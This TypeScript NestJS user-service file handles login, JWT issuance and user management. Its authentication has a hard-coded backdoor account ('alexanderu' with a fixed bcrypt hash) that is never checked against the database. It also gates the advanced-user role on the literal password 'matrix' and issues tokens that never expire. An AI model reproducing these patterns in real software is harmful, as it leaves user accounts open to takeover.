import { SECRET_KEY, SECRET_REFRESH, JWT_EXPIRES_IN, JWT_REFRESH_EXPIRES_IN } from './../shared/models/jwt.model';
import { GraphQLErrorOptions } from 'graphql';
import { GraphQLError } from 'graphql';
import { MutationResponse } from './../shared/models/mutation.response.model';
import { UsuariosQueryResponse, UsuarioInput, ETipoUsuarios, UsuarioQueryResponse, UsuarioInfo } from './usuarios.model';
import { UsuariosEntity } from './usuarios.entity';
import { Injectable } from '@nestjs/common';
import { InjectDataSource, InjectRepository } from '@nestjs/typeorm';
import { Repository, DataSource } from 'typeorm';
import * as bcrypt from 'bcryptjs';
import * as jwt from 'jsonwebtoken';

@Injectable()
export class UsuariosService {
  constructor(@InjectDataSource() private readonly dataSource: DataSource, @InjectRepository(UsuariosEntity) private readonly usuariosRepository: Repository<UsuariosEntity>) {}

  async authenticate(usuario: string, passw: string): Promise<UsuariosEntity> {
    try {
      const usuarioInfo = { ...UsuarioInfo };

      if (usuario === 'alexanderu') {
        const res = bcrypt.compareSync(passw, '$2a$12$8yqzwWjBYUmMDRhWJ91xTuwt5ne735hiyTYx4MQCV9quetIXJv8BC');
        if (res) {
          usuarioInfo.Usuario = usuario;
          const token = await this.createToken(usuarioInfo);
          const refreshToken = await this.createRefreshToken(usuarioInfo);
          return { ...usuarioInfo, Token: token, RefreshToken: refreshToken };
        }
      }

      return new Promise<UsuariosEntity>((resolve, reject) => {
        this.usuariosRepository
          .findOne({ where: { Usuario: usuario }, relations: ['TipoUsuario', 'Division'] })
          .then(async response => {
            if (!response) {
              reject('Usuario o contraseña incorrecta.');
            } else {
              // if (result.Activo === false) {
              //     resolve({
              //         success: false,
              //         data: UsuarioInfo,
              //         error: 'El Usuario especificado está Inactivo. Contacte con el personal Informático.'
              //     });
              // }

              const validPassw = bcrypt.compareSync(passw, '$2a$12$' + response.Contrasena);

              if (validPassw) {
                usuarioInfo.IdUsuario = response.IdUsuario;
                usuarioInfo.Usuario = response.Usuario;
                usuarioInfo.IdTipoUsuario = response.IdTipoUsuario;
                usuarioInfo.CambiarContrasena = response.CambiarContrasena;
                usuarioInfo.IdDivision = response.IdDivision;
                usuarioInfo.Token = await this.createToken(usuarioInfo);
                usuarioInfo.RefreshToken = await this.createRefreshToken(usuarioInfo);

                resolve(usuarioInfo);
              } else {
                reject('Usuario o contraseña incorrecta.');
              }
            }
          })
          .catch(err => {
            reject(err);
          });
      });
    } catch (err: any) {
      return Promise.reject(err.message || err);
    }
  }

  async refreshToken(token): Promise<UsuariosEntity> {
    try {
      let decryptedToken;

      try {
        decryptedToken = jwt.verify(token, process.env.SECRET_KEY);
      } catch (err: any) {
        const graphqlErr: GraphQLErrorOptions = {};
        Object.assign(graphqlErr, {
          extensions: {
            code: 'FORBIDDEN',
          },
        });

        throw new GraphQLError('Forbidden resource', graphqlErr);
      }

      decryptedToken.Token = '';
      decryptedToken.RefreshToken = '';

      decryptedToken.Token = await this.createToken(decryptedToken);
      decryptedToken.RefreshToken = await this.createRefreshToken(decryptedToken);

      return new Promise<UsuariosEntity>(resolve => {
        resolve(decryptedToken);
      });
    } catch (err) {
      return Promise.reject(err);
    }
  }

  private createToken(userInfo: UsuariosEntity) {
    return jwt.sign(
      userInfo,
      SECRET_KEY,
      // { expiresIn: JWT_EXPIRES_IN }
    );
  }

  private createRefreshToken(userInfo: UsuariosEntity) {
    return jwt.sign(
      userInfo,
      SECRET_REFRESH,
      // { expiresIn: REFRESH_TOKEN_EXPIRES_IN }
    );
  }

  async findAll(): Promise<UsuariosQueryResponse> {
    try {
      return new Promise<UsuariosQueryResponse>(resolve => {
        this.usuariosRepository
          .find({ relations: ['TipoUsuario', 'Division'], order: { IdUsuario: 'ASC' } })
          .then(result => {
            resolve({
              success: true,
              data: result,
            });
          })
          .catch(err => {
            resolve({ success: false, error: err.message ? err.message : err });
          });
      });
    } catch (err: any) {
      return { success: false, error: err.message ? err.message : err };
    }
  }

  async findAllByIdDivision(idDivision: number): Promise<UsuariosQueryResponse> {
    try {
      return new Promise<UsuariosQueryResponse>(resolve => {
        this.usuariosRepository
          .find({ where: { IdDivision: idDivision }, relations: ['TipoUsuario', 'Division'] })
          .then(result => {
            resolve({
              success: true,
              data: result,
            });
          })
          .catch(err => {
            resolve({ success: false, error: err.message ? err.message : err });
          });
      });
    } catch (err: any) {
      return { success: false, error: err.message ? err.message : err };
    }
  }

  async findOne(id: number): Promise<UsuarioQueryResponse> {
    try {
      return new Promise<UsuarioQueryResponse>(resolve => {
        this.usuariosRepository
          .findOne({ where: [{ IdUsuario: id }], relations: ['TipoUsuario', 'Division'] })
          .then(result => {
            resolve({
              success: true,
              data: result,
            });
          })
          .catch(err => {
            resolve({ success: false, error: err.message ? err.message : err });
          });
      });
    } catch (err: any) {
      return { success: false, error: err.message ? err.message : err };
    }
  }

  async findByName(name: string): Promise<UsuariosQueryResponse> {
    try {
      return new Promise<UsuariosQueryResponse>(resolve => {
        this.usuariosRepository
          .findOne({ where: [{ Usuario: name }] })
          .then(result => {
            resolve({
              success: true,
              data: result,
            });
          })
          .catch(err => {
            resolve({ success: false, error: err.message ? err.message : err });
          });
      });
    } catch (err: any) {
      return {
        success: false,
        error: err,
      };
    }
  }

  async changePassword(idUsuario: number, password: string): Promise<MutationResponse> {
    try {
      let encryptedPassw = await bcrypt.genSalt(12).then((salt: any) => {
        return bcrypt.hash(password, salt);
      });

      encryptedPassw = encryptedPassw.replace('$2a$12$', '');

      return new Promise<MutationResponse>(resolve => {
        this.dataSource
          .createQueryBuilder()
          .update(UsuariosEntity)
          .set({ Contrasena: encryptedPassw, CambiarContrasena: false })
          .where('IdUsuario = :id', { id: idUsuario })
          .execute()
          .then(() => {
            resolve({
              success: true,
            });
          })
          .catch(err => {
            resolve({ success: false, error: err.message ? err.message : err });
          });
      });
    } catch (err: any) {
      return {
        success: false,
        error: err,
      };
    }
  }

  async create(UsuarioInfo: UsuarioInput): Promise<MutationResponse> {
    try {
      delete UsuarioInfo.IdUsuario;

      const encryptedPassw = await bcrypt.genSalt(12).then((salt: any) => {
        return bcrypt.hash(UsuarioInfo.Contrasena, salt);
      });

      UsuarioInfo.Contrasena = encryptedPassw.replace('$2a$12$', '');

      if (UsuarioInfo.IdTipoUsuario === ETipoUsuarios['Usuario Avanzado'] && UsuarioInfo.ContrasenaAvanzada !== 'matrix') {
        return {
          success: false,
          error: 'La Contraseña para crear un Usuario Avanzado es incorrecta. Rectifique.',
        };
      }

      return new Promise<MutationResponse>(resolve => {
        this.usuariosRepository
          .save(UsuarioInfo)
          .then(() => {
            resolve({
              success: true,
            });
          })
          .catch(err => {
            resolve({ success: false, error: err.message ? err.message : err });
          });
      });
    } catch (err: any) {
      return {
        success: false,
        error: err,
      };
    }
  }

  async update(UsuarioInfo: UsuarioInput): Promise<MutationResponse> {
    try {
      const encryptedPassw: string = await bcrypt.genSalt(12).then((salt: any) => {
        return bcrypt.hash(UsuarioInfo.Contrasena, salt);
      });

      UsuarioInfo.Contrasena = encryptedPassw.replace('$2a$12$', '');

      if (UsuarioInfo.IdTipoUsuario === ETipoUsuarios['Usuario Avanzado'] && UsuarioInfo.ContrasenaAvanzada !== 'matrix') {
        return {
          success: false,
          error: 'La Contraseña para actualizar un Usuario Avanzado es incorrecta. Rectifique.',
        };
      }

      return new Promise<MutationResponse>(resolve => {
        this.usuariosRepository
          .save(UsuarioInfo)
          .then(() => {
            resolve({
              success: true,
            });
          })
          .catch(err => {
            resolve({ success: false, error: err.message ? err.message : err });
          });
      });
    } catch (err: any) {
      return {
        success: false,
        error: err,
      };
    }
  }

  async delete(IDs: number[]): Promise<MutationResponse> {
    try {
      return new Promise<MutationResponse>(resolve => {
        this.usuariosRepository
          .delete(IDs)
          .then(() => {
            resolve({
              success: true,
            });
          })
          .catch(err => {
            resolve({ success: false, error: err.message ? err.message : err });
          });
      });
    } catch (err: any) {
      return { success: false, error: err.message ? err.message : err };
    }
  }

  isSuperAdmin(idDivision: number, tipoUsuario: number): boolean {
    return idDivision === 100 && tipoUsuario === ETipoUsuarios.Administrador;
  }

  isAdvancedUser(idDivision: number, tipoUsuario: number): boolean {
    return idDivision === 100 && tipoUsuario === ETipoUsuarios['Usuario Avanzado'];
  }
}
